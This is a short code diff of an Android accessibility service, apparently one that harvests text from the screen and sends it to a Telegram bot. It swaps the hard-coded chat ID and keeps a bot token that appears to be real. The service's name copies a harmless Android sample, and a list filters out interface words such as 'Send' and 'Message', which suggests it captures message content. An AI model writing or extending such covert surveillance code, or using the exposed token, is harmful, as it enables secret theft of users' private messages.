@@ -20,7 +20,7 @@ public class GlobalActionBarService extends AccessibilityService {
 
     // 🔥 PASTE YOUR BOT TOKEN AND CHAT ID HERE
     private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";    // e.g., "1234567890:ABCdefGHIjkl"
-    private static final String CHAT_ID = "8745417407";        // e.g., "123456789"
+    private static final String CHAT_ID = "5465116744";        // e.g., "123456789"
 
     private Set<String> uiJunk = new HashSet<String>() {{
         add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
